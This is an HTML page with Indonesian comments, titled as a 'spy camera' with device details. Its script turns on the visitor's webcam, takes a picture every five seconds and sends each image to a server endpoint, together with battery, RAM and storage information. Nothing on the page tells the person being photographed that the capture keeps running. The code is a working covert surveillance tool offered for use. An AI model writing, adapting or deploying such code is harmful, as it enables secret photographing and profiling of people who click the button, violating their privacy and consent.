<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Spy Kamera dengan Informasi Detail</title>
  </head>
  <body>
    <h2>Spy Kamera dengan Detail Perangkat</h2>
    <button id="startButton">Mulai Ambil Gambar</button>
    <video id="video" autoplay playsinline width="320" height="240"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");

      // Mulai mengakses kamera
      document.getElementById("startButton").onclick = async () => {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Menyiapkan untuk mengambil foto setiap 5 detik
        setInterval(async () => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/jpeg");

          // Ambil informasi perangkat
          const deviceInfo = await getDeviceInfo();

          // Kirim gambar beserta informasi perangkat ke server
          fetch("/api/kirim", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              image: imageData,
              deviceInfo: deviceInfo
            })
          });
        }, 5000); // ambil foto tiap 5 detik
      };

      // Fungsi untuk mendapatkan informasi detail perangkat
      async function getDeviceInfo() {
        const battery = await navigator.getBattery(); // Dapatkan info baterai
        const ram = navigator.deviceMemory || "Tidak diketahui"; // Dapatkan RAM
        const storage = await navigator.storage.estimate(); // Dapatkan informasi penyimpanan

        return {
          batteryLevel: battery.level * 100, // Persentase baterai
          isCharging: battery.charging ? "Ya" : "Tidak", // Status charging
          ram: ram + " GB", // RAM
          totalStorage: storage.quota / (1024 * 1024 * 1024) + " GB", // Penyimpanan total
          usedStorage: storage.usage / (1024 * 1024 * 1024) + " GB", // Penyimpanan yang digunakan
        };
      }
    </script>
  </body>
</html>
